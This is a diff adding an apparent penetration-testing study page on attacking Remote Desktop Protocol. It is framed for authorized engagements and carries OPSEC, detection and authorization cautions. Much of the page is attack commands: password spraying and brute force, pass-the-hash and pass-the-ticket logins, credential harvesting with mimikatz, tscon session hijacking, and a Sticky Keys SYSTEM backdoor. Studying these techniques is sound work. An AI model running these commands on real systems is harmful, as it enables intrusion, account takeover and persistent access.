@@ -1,0 +1,448 @@
+---
+title: RDP - Port 3389
+description: Enumeration and attack methodology for Remote Desktop Protocol on port 3389, covering pre-auth intelligence, NLA and encryption checks, credential spraying, pass-the-hash, pass-the-ticket, file transfer, and session hijacking.
+openGraph:
+  title: "RDP - Port 3389"
+  description: "Enumeration and attack methodology for Remote Desktop Protocol on port 3389, covering pre-auth intelligence, NLA and encryption checks, credential spraying, pass-the-hash, pass-the-ticket, file transfer, and session hijacking."
+  images:
+    - url: /imgs/rdp.jpg
+      width: 1672
+      height: 941
+      alt: RDP - Port 3389
+      type: image/jpeg
+twitter:
+  card: summary_large_image
+  title: "RDP - Port 3389"
+  description: "Enumeration and attack methodology for Remote Desktop Protocol on port 3389, covering pre-auth intelligence, NLA and encryption checks, credential spraying, pass-the-hash, pass-the-ticket, file transfer, and session hijacking."
+  images:
+    - url: /imgs/rdp.jpg
+      width: 1672
+      height: 941
+      alt: RDP - Port 3389
+      type: image/jpeg
+---
+
+# RDP - Port 3389
+
+import { Callout } from 'nextra/components'
+
+## Cheatsheet
+
+```bash
+nmap -sV -sC -p3389 <IP>
+nmap --script rdp-ntlm-info -p3389 <IP>
+nmap --script rdp-enum-encryption -p3389 <IP>
+
+nxc rdp <IP> -u users.txt -p '<PASS>'             # password spray
+nxc rdp <IP> -u <USER> -H <HASH>                  # pass-the-hash 
+nxc rdp <SUBNET>/24 -u <USER> -p <PASS>           # subnet sweep
+
+# Connect xfreerdp3 (modern client)
+xfreerdp3 /u:<USER> /p:<PASS> /v:<IP> /cert:ignore /dynamic-resolution
+xfreerdp3 /u:<USER> /p:<PASS> /v:<IP> /d:<DOMAIN> /cert:ignore
+xfreerdp3 /u:<USER> /pth:<HASH> /v:<IP> /cert:ignore           # pass-the-hash
+xfreerdp3 /u:<USER> /p:<PASS> /v:<IP> /cert:ignore /drive:loot,/home/kali/loot
+
+# i recommedn using remmina instead of xfreerdp3
+
+# Kerberos pass-the-ticket
+KRB5CCNAME=admin.ccache xfreerdp3 /u:<USER> /v:<FQDN> /cert:ignore /sec:nla
+
+# Brute force / spray 
+hydra -l <USER> -P /usr/share/wordlists/rockyou.txt rdp://<IP> -t 4
+```
+
+```cmd
+:: Post-exploitation, run on a compromised host saved RDP servers + creds
+reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
+cmdkey /list
+
+:: Session hijack (requires SYSTEM)
+query user
+tscon <SESSION_ID> /dest:console
+```
+
+## Methodology
+
+### Phase 1: Pre-Auth Intelligence
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - What domain, FQDN, and OS build does the host disclose without authentication?
+  - Is NLA enforced, optional, or disabled and how does that change my options?
+  - Does the OS build line up with an unpatched BlueKeep-family target?
+  - What FQDN do I need to capture now for Kerberos pass-the-ticket later?
+</Callout>
+
+```bash
+nmap -sV -sC -p3389 <IP>
+nmap --script rdp-ntlm-info -p3389 <IP>
+nmap --script rdp-enum-encryption -p3389 <IP>
+```
+
+- [ ] `nmap -sV -sC -p3389 <IP>` confirm RDP and capture the OS hint.
+- [ ] `nmap --script rdp-ntlm-info -p3389 <IP>` **the single highest-value RDP recon command**. Returns NetBIOS name, NetBIOS domain, DNS domain, FQDN, nd OS build, all unauthenticated. This seeds the entire AD enumeration phase: you learn the domain before sending a single LDAP query.
+- [ ] `nmap --script rdp-enum-encryption -p3389 <IP>` surfaces the accepted security layers. Note NLA support and whether legacy `RDP` encryption is still allowed.
+- [ ] Record the **NLA posture**: enforced means credentials must be valid before any session (PtH needs Restricted Admin Mode; brute force is high-cost); optional/disabled means clients can drop to a graphical login screen that is brute-forceable and may leak usernames.
+- [ ] Store the disclosed FQDN `xfreerdp3` against an IP forces NTLM, against an FQDN allows Kerberos.
+
+### Phase 2: Vulnerability Assessment
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Does the OS build place this host in the BlueKeep/DejaBlue range?
+  - Is a scanner finding alone enough for the report, or do I genuinely need code execution?
+  - What is the BSOD/production-impact risk of running the exploit here?
+</Callout>
+
+```bash
+# MS12-020 (DoS indicator of an ancient unpatched host)
+nmap --script rdp-vuln-ms12-020 -p3389 <IP>
+
+# BlueKeep (CVE-2019-0708) scanner 
+msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS <IP>; run; exit"
+```
+
+- [ ] `nmap --script rdp-vuln-ms12-020 -p3389 <IP>` MS12-020 is DoS-only (BSOD), but its presence flags an unpatched ancient host with everything that implies.
+- [ ] Run the BlueKeep **scanner** module (CVE-2019-0708). Vulnerable: Windows XP/Vista/7, Server 2003/2008/2008 R2. DejaBlue (CVE-2019-1181/1182) extends the family through Windows 10 / Server 2019.
+- [ ] If a BlueKeep-family vuln is confirmed, **document the Critical finding and stop**. The scanner is safe; the exploit is not do not run it on a production host without explicit written authorization for that host.
+
+<Callout type="warning">
+**BlueKeep exploitation has a real BSOD risk.** The Metasploit exploit targets a heap layout that varies by exact build; getting it wrong crashes the kernel and can take a production server offline. The scanner finding alone is a Critical report item you do not need a working shell to make the case. Reserve the exploit for lab/CTF/authorized destructive-test windows.
+</Callout>
+
+
+### Phase 3: Credential Validation and Spraying
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+  - Which credentials harvested from SMB/WinRM/databases have I not yet tried against RDP?
+  - Is single-password spraying safer than user-by-user given the lockout policy?
+  - Is brute force actually permitted here (NLA off, lockout confirmed safe)?
+  - Can I validate without burning a full interactive session (screenshot mode)?
+</Callout>
+
+```bash
+# Validate / spray harvested credentials
+nxc rdp <IP> -u <USER> -p <PASS>
+nxc rdp <IP> -u users.txt -p '<PASS>'             # single-password spray (safest)
+nxc rdp <SUBNET>/24 -u <USER> -p <PASS>           # subnet sweep
+nxc rdp <IP> -u <USER> -p <PASS> --screenshot     # validate + capture desktop
+
+# Last resort, only if NLA is off and lockouts are safe
+crowbar -b rdp -s <IP>/32 -u <USER> -C passwords.txt
+```
+
+- [ ] `nxc rdp <IP> -u <USER> -p <PASS>`  RDP is one of the highest-value reuse targets; admins routinely reuse the same password across SMB, WinRM, and RDP.
+- [ ] `nxc rdp <IP> -u users.txt -p '<PASS>'` single-password spray is the safest pattern against AD lockouts.
+- [ ] `nxc rdp <SUBNET>/24 -u <USER> -p <PASS>` find every host that accepts the credential in one shot; one credential often unlocks ten or more hosts on a flat network.
+- [ ] `nxc rdp <IP> -u <USER> -p <PASS> --screenshot` confirm the credential and capture the post-login desktop without opening a full interactive session (clean evidence, minimal OPSEC).
+- [ ] Brute force (`crowbar`/`hydra`) only if NLA is off and lockouts are confirmed safe. Crowbar implements the protocol natively and is more reliable than Hydra for RDP.
+
+<Callout type="warning">
+**OPSEC:** Every attempt generates Security 4624 (success) or 4625 (failure). Successful RDP logons are Logon Type 10 (RemoteInteractive) easy to baseline and alert on, and Defender for Identity flags spray patterns within seconds. Exhaust silent enumeration and credential reuse before any brute force, and prefer single-password spraying when you must spray.
+</Callout>
+
+### Phase 4: Pass-the-Hash and Pass-the-Ticket
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Is the NTLM hash valid for RDP at all (`nxc rdp -H`)?
+  - Is Restricted Admin Mode enabled on the target, or must I enable it via another foothold?
+  - Do I have a Kerberos ticket that avoids the Restricted Admin Mode requirement entirely?
+  - Which path leaves the session usable for further lateral movement?
+</Callout>
+
+```bash
+# Validate the hash, then connect via PtH (needs RAM on target)
+nxc rdp <IP> -u <USER> -H <HASH>
+xfreerdp3 /u:<USER> /pth:<HASH> /v:<IP> /cert:ignore
+
+# Kerberos pass-the-ticket no Restricted Admin Mode required
+export KRB5CCNAME=admin.ccache
+xfreerdp3 /u:<USER> /v:<FQDN> /cert:ignore /sec:nla
+```
+
+```cmd
+:: On the TARGET (via an existing admin foothold) enable Restricted Admin Mode
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0 /f
+```
+
+- [ ] `nxc rdp <IP> -u <USER> -H <HASH>` validate the hash before attempting an interactive PtH connection.
+- [ ] `xfreerdp3 /u:<USER> /pth:<HASH> /v:<IP> /cert:ignore` works **only** when Restricted Admin Mode is enabled on the target (`DisableRestrictedAdmin = 0`). NLA does not block PtH; the missing RAM key does.
+- [ ] If you already have admin via WinRM/psexec/SMB, flip the RAM registry key yourself, then reconnect via PtH.
+- [ ] Prefer **Pass-the-Ticket** (`KRB5CCNAME=...ccache xfreerdp3 /u:<USER> /v:<FQDN> /sec:nla`): it works without Restricted Admin Mode, leaves the session fully credentialed for further lateral movement, and produces Kerberos logs rather than conspicuous NTLM.
+
+<Callout type="info">
+Restricted Admin Mode is **disabled by default** on every modern Windows release. In a real environment, PtH over RDP almost always fails on the first try and succeeds via Kerberos PtT instead   assume you will either enable RAM yourself (needs another foothold) or pivot to a ticket.
+</Callout>
+
+**Move to Phase 5** once you can authenticate (password, PtH with RAM enabled, or PtT).
+
+### Phase 5: Connect and Land Comfortably
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Do I actually need the GUI, or would WinRM be quieter for this task?
+  - How will I move files in and out without touching SMB?
+  - Does the target negotiate a security layer my client will accept, or must I force one?
+  - Do I need a screenshot for reporting evidence?
+</Callout>
+
+```bash
+# Interactive session with a redirected local folder for file transfer
+xfreerdp3 /u:<USER> /p:<PASS> /v:<IP> /cert:ignore /dynamic-resolution /drive:loot,/home/kali/loot
+
+# Force a security layer when the negotiated default fails
+xfreerdp3 /u:<USER> /p:<PASS> /v:<IP> /cert:ignore /sec:nla
+```
+
+- [ ] `xfreerdp3 ... /dynamic-resolution` reflows the desktop on resize so the session is usable on any monitor.
+- [ ] `/drive:loot,/home/kali/loot` ounts a local folder that appears inside the session as `\\tsclient\loot`, giving two-way file transfer without ever touching SMB.
+- [ ] Force `/sec:nla` or `/sec:tls` explicitly when the negotiated default fails older targets sometimes negotiate down to legacy `rdp` encryption that modern xfreerdp refuses.
+- [ ] `nxc rdp <IP> -u <USER> -p <PASS> --screenshot`  capture login/desktop evidence without a full interactive session when that is all you need.
+
+**Move to Phase 6** once you have an interactive desktop (or have confirmed access and decided RDP is the right interface for the task).
+
+### Phase 6: Post-Compromise Pillage and Pivot
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Which artifacts are easier to grab from a real desktop than from a non-interactive shell?
+  - Where has this user RDP'd before, and with which account (lateral-movement map)?
+  - Are there saved credentials in Credential Manager or `.rdp` files to decrypt?
+  - Which captured credentials should I immediately spray against the rest of the subnet?
+</Callout>
+
+```cmd
+:: Outbound RDP history + stored credentials
+reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
+cmdkey /list
+dir /s /b %USERPROFILE%\Documents\*.rdp
+```
+
+- [ ] `reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"` every key is a host this user RDP'd to, often with a `UsernameHint`. One of the most reliable lateral-movement maps in Windows.
+- [ ] `cmdkey /list` entries in Credential Manager; domain credentials live here when users tick "Remember me". Decrypt the DPAPI blobs in `%LOCALAPPDATA%\Microsoft\Credentials\` with mimikatz `dpapi::cred`.
+- [ ] `dir /s /b %USERPROFILE%\Documents\*.rdp` MSTSC profiles, sometimes with DPAPI-encrypted saved passwords.
+- [ ] Because RDP gives a real desktop, launch the user's browser and read saved passwords from the GUI password manager directly  faster than running sharpchrome on a hardened target.
+- [ ] When you hold both RDP *and* WinRM creds for the same target, default to **WinRM via evil-winrm**: faster, scriptable, Logon Type 3 (Network) instead of Type 10 (RemoteInteractive), native file transfer, and no GUI cache artifacts. Use RDP only when you specifically need the GUI Credential Manager UI, browser password manager, a thick-client app, or visual reporting evidence.
+
+### Phase 7: Session Hijacking and Persistence
+
+<Callout type="default" emoji="?">
+  **Ask yourself**
+
+  - Do I have SYSTEM (not just admin), which `tscon` hijacking requires?
+  - Is there a higher-privilege user's session worth hijacking right now?
+  - Will the hijack disconnect the victim and risk raising an alarm?
+  - Is persistence in scope, and which technique is least likely to be flagged by EDR?
+</Callout>
+
+```cmd
+:: As SYSTEM (e.g. psexec.exe -i -s -d cmd.exe) list and hijack sessions
+query user
+tscon <SESSION_ID> /dest:console
+
+:: Sticky Keys backdoor (needs write to System32; loud, EDR-flagged)
+takeown /f C:\Windows\System32\sethc.exe
+icacls C:\Windows\System32\sethc.exe /grant administrators:F
+copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+```
+
+- [ ] `query user` list every active session; look for other admins logged in.
+- [ ] As **SYSTEM**, `tscon <SESSION_ID> /dest:console` hijacks any session with no password, MFA, or UAC prompt you inherit the victim's fully-authenticated desktop. The victim's active session is silently disconnected.
+- [ ] `mstsc /shadow:<SESSION_ID> /control` RDP session shadowing; requires admin and a permissive shadowing GPO.
+- [ ] **Sticky Keys / Utilman backdoor**  replace `sethc.exe`/`Utilman.exe` with `cmd.exe` for a pre-auth SYSTEM shell at the login screen that survives reboots and password rotation. Same trick works with `osk.exe`.
+
+<Callout type="warning">
+**OPSEC:** The Sticky Keys / Utilman backdoor is famous and trivially caught by modern EDR and file-integrity monitoring (Sysmon 11 on `sethc.exe`/`Utilman.exe`). Treat it as a known-burned technique unless you have confirmed the environment lacks endpoint protection useful in CTFs and neglected legacy environments, reckless on a monitored networ
+</Callout>
+
+**Loop back to Phase 3** with any credentials captured here to continue spreading. When you hold the objective or have exhausted reachable hosts, move to reporting.
+
+<Quiz
+  question="You're scanning an external-facing Server 2008 R2 host and BlueKeep (CVE-2019-0708) confirms vulnerable. Scope permits exploitation of any in-scope target. The host is the company's primary file server. What's the correct play?"
+  options={[
+    "Run the Metasploit BlueKeep exploit immediately pre-auth SYSTEM is the highest-value win",
+    "Run only the scanner module, document the Critical finding, and pursue access via other vectors first",
+    "Skip BlueKeep entirely the CVE is too old to be useful in a modern report",
+    "Run the exploit during off-hours so any BSOD is less impactful"
+  ]}
+  answer={1}
+  explanation="The Metasploit BlueKeep exploit has a documented BSOD failure mode reliability depends on the exact build, and a wrong heap layout crashes the kernel. On a production file server that means data offline, possible file corruption, and triggered DR procedures. Even with scope permitting exploitation, that risk demands explicit written authorization for the specific host plus a recovery plan. Option 4 does not remove the BSOD risk and may worsen impact if no one is watching. Option 1 is reckless; option 3 misreads the situation since the scanner finding alone is Critical. The right answer is option 2: confirm with the safe scanner, write it up, and pursue other access vectors request explicit authorization with a maintenance window if you later need working RCE to demonstrate impact."
+/>
+
+## Overview
+
+RDP (Remote Desktop Protocol) is Microsoft's proprietary remote graphical desktop protocol, descended from ITU-T T.128. It tunnels keyboard, mouse, display, audio, clipboard, drive redirection, and printer mapping over a single TCP channel (and increasingly UDP for low-latency display). It is the standard remote-administration protocol on every modern Windows release and the most operator-friendly post-credential interface on Windows engagements.
+
+| Detail | Value |
+|--------|-------|
+| Port | 3389/TCP (and 3389/UDP for low-latency display on RDP 8+) |
+| Protocol | T.128 / T.125 over TPKT |
+| Encryption | TLS, CredSSP (NLA), legacy RDP encryption (deprecated) |
+| Auth methods | NTLM, Kerberos, smart card, Restricted Admin Mode, Remote Credential Guard |
+| Server config | `tsconfig.msc`, `gpedit.msc → Computer Configuration → Administrative Templates → Windows Components → Remote Desktop Services` |
+| Key event IDs | 4624 Type 10 (interactive logon), 4625 (failed), 4634 (logoff), 4778/4779 (reconnect/disconnect), 1149 (RemoteConnectionManager) |
+
+### Security Layers
+
+| Layer | Description |
+|-------|-------------|
+| Standard RDP | Legacy, weak accepts pre-auth session, deprecated and disabled in modern builds |
+| TLS | Standard TLS encryption of the transport, no early authentication |
+| CredSSP / NLA | Network Level Authentication full credential validation before the session. Default on Windows 8+/Server 2012+ |
+| Restricted Admin Mode | Allows PtH-style auth without sending the credential to the target   required for PtH over RDP |
+| Remote Credential Guard | Forwards credential operations back to the client, preventing theft from a compromised target |
+
+## Quick Reference
+
+```bash
+nmap -sV -sC -p3389 <IP>                                                # Service scan
+nmap --script rdp-ntlm-info -p3389 <IP>                                 # Pre-auth host/domain disclosure
+nmap --script rdp-enum-encryption -p3389 <IP>                           # Encryption / NLA check
+msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; \
+  set RHOSTS <IP>; run; exit"                                           # BlueKeep scan
+
+nxc rdp <IP> -u <USER> -p <PASS>                                        # Validate single credential
+nxc rdp <IP> -u users.txt -p passwords.txt                              # Credential spray
+nxc rdp <IP> -u users.txt -p '<PASS>'                                   # Single-password spray
+nxc rdp <IP> -u <USER> -H <HASH>                                        # Pass-the-hash check
+nxc rdp <IP> -u <USER> -p <PASS> --screenshot                           # Auto-screenshot login
+
+xfreerdp3 /u:<USER> /p:<PASS> /v:<IP> /cert:ignore /dynamic-resolution  # Connect (password)
+xfreerdp3 /u:<USER> /pth:<HASH> /v:<IP> /cert:ignore                    # Connect (PtH)
+KRB5CCNAME=ccache xfreerdp3 /u:<USER> /v:<FQDN> /cert:ignore /sec:nla   # Connect (Kerberos PtT)
+
+# Drive redirection (shows as \\tsclient\loot)
+xfreerdp3 ... /drive:loot,/home/kali/loot
+
+reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"       # Saved RDP servers
+query user                                                              # Active sessions
+tscon <SESSION_ID> /dest:console                                       # Session hijack (as SYSTEM)
+```
+
+## Pass-the-Hash and Restricted Admin Mode
+
+PtH over RDP causes more confusion than any other technique because it depends on a setting **disabled by default** on every modern Windows release.
+
+### How PtH over RDP Works
+
+In a normal RDP login, the client sends the cleartext password (or a Kerberos ticket) to the server. PtH submits the NTLM hash directly but RDP's normal flow has no place for a raw hash. **Restricted Admin Mode** changes the protocol: the client uses local credentials (or a hash) to prove identity, and the server creates a session with no network credentials. This is what allows `xfreerdp3 /pth:` to work the client passes the hash to its own SSPI subsystem, which negotiates with the server's CredSSP layer using the hash as the auth material.
+
+### Side Effects of Restricted Admin Mode
+
+| Property | Detail |
+|----------|--------|
+| Network credentials | The session has **no** outbound credentials you cannot authenticate to other resources from inside |
+| Pass-the-hash | Enabled `xfreerdp3 /pth:` works |
+| Single sign-on | Broken no SMB shares, mapped drives, or domain resources from inside |
+| Logging | Logon Type 10 still recorded; the logged-on user is the account whose hash was used |
+| Lateral movement from inside | Must be re-authenticated explicitly with `runas`, token tricks, or fresh creds |
+
+<Callout type="info">
+Pass-the-Ticket (Kerberos) is the cleaner alternative when you have a TGT or service ticket. It works without Restricted Admin Mode, leaves the session fully credentialed for lateral movement, and produces logs that look like normal Kerberos activity. Given a choice between PtH and PtT, always pick PtT.
+</Callout>
+
+## xfreerdp3 Reference
+
+`xfreerdp3` is the modern FreeRDP CLI client (`xfreerdp` on older distros Kali ships both). Use the `3` suffix where available.
+
+```bash
+# Authentication
+/u:<USER>                # Username
+/p:<PASS>                # Password
+/d:<DOMAIN>              # Domain (NetBIOS or FQDN)
+/pth:<HASH>             # Pass-the-hash (requires RAM on target)
+/v:<IP|FQDN>             # Target host
+/v:<IP>:<PORT>           # Non-standard port
+/cert:ignore             # Accept any certificate (required for self-signed)
+
+# Display
+/dynamic-resolution      # Reflow on resize use on every connection
+/f                       # Fullscreen
+/size:1920x1080          # Fixed resolution
+/multimon                # Multi-monitor
+
+# File transfer + clipboard
+/drive:<NAME>,<PATH>     # Mount local directory as \\tsclient\<NAME>
+/clipboard               # Enable clipboard sharing (default on)
+
+# Security negotiation
+/sec:nla                 # Force NLA (CredSSP)
+/sec:tls                 # Force TLS only
+/sec:rdp                 # Force legacy RDP encryption (deprecated)
+
+# Kerberos
+/kerberos:enabled        # Use Kerberos (FQDN required, KRB5CCNAME for PtT)
+```
+
+## Session Hijacking and Lateral Movement
+
+Once you have local admin (and thus SYSTEM via `psexec -s`, token theft, or a service install), other users' RDP sessions on the same host become accessible without their passwords.
+
+### tscon Session Hijacking
+
+```cmd
+:: As SYSTEM (psexec.exe -i -s -d cmd.exe)
+query user
+:: USERNAME    SESSIONNAME    ID    STATE    IDLE TIME    LOGON TIME
+:: alice       rdp-tcp#23     2     Active   .            10/14/2026 09:14
+:: bob         rdp-tcp#24     3     Disc     5            10/14/2026 09:21
+
+tscon 2 /dest:console     :: hijack alice's session to the local console
+tscon 3 /dest:rdp-tcp#99  :: hijack bob's disconnected session to a new RDP channel
+```
+
+The hijack is silent for the hijacker   no password prompt, no MFA, no UAC. `tscon` (`%SystemRoot%\System32\tscon.exe`) asks the Terminal Services subsystem to reattach a session to a different console; the only security check is "are you SYSTEM or do you hold `SeTcbPrivilege`?", neither of which needs the target user's password. This was designed for help-desk shadowing.
+
+### Sticky Keys / Utilman Backdoor
+
+Pre-auth SYSTEM shell that persists across reboots and survives password rotation. Requires write access to `C:\Windows\System32\` (admin or TrustedInstaller).
+
+```cmd
+:: Replace sethc.exe (Sticky Keys) with cmd.exe
+takeown /f C:\Windows\System32\sethc.exe
+icacls C:\Windows\System32\sethc.exe /grant administrators:F
+copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+
+:: At the RDP login screen, press SHIFT five times → SYSTEM cmd.exe
+```
+
+The same trick works with `Utilman.exe` (the accessibility button) and `osk.exe`. Modern Windows audits the file replacement, but the runtime invocation still works once the swap is in place.
+
+## Saved Credentials and Mstsc Artifacts
+
+RDP leaves a useful audit trail of *outbound* connections in every user's profile. After landing, harvest these before pivoting.
+
+| Artifact | Path | Contents |
+|----------|------|----------|
+| Saved RDP servers | `HKCU\Software\Microsoft\Terminal Server Client\Servers` | Hosts the user RDP'd to, often with `UsernameHint` |
+| Default username | `HKCU\Software\Microsoft\Terminal Server Client\Default` | Most-recently-used target |
+| `.rdp` profiles | `%USERPROFILE%\Documents\*.rdp` | Connection details, sometimes DPAPI-encrypted passwords |
+| Credential Manager | `cmdkey /list` and `%LOCALAPPDATA%\Microsoft\Credentials\` | Domain creds saved during auth prompts |
+| MRU lists | `HKCU\Software\Microsoft\Terminal Server Client\LocalDevices` | Mounted local devices from previous sessions reveals other hosts |
+
+Decrypting Credential Manager DPAPI blobs needs either the user's password or SYSTEM-level access via mimikatz `dpapi::cred /in:<file> /masterkey:<mkey>` one of the highest-yield credential-harvesting paths on a Windows engagement.
+
+## Dangerous Settings
+
+| Setting | Risk |
+|---------|------|
+| NLA disabled (`UserAuthentication = 0`) | Brute force viable, login screen leaks usernames, weaker pre-session encryption |
+| Legacy RDP encryption allowed (`SecurityLayer = 0`) | Sniffable session traffic, weak key exchange |
+| `DisableRestrictedAdmin = 0` | PtH over RDP works without further preparation |
+| RDP exposed externally without VPN | Internet-wide credential-spraying target |
+| `Allow log on through Remote Desktop Services` granted broadly | Too many accounts can RDP increases reuse value |
+| RDP without certificate validation | MITM possible credential interception during NLA |
+| Session shadowing GPO permissive | Help-desk-style takeover available to lower-tier admins |
+
+
+<div className="flex flex-wrap gap-2 mb-4">
+  #pentest #redteam #certification #windows #rdp #remoteaccess #lateral-movement #credentials #attack-surface #postexploitation
+</div>
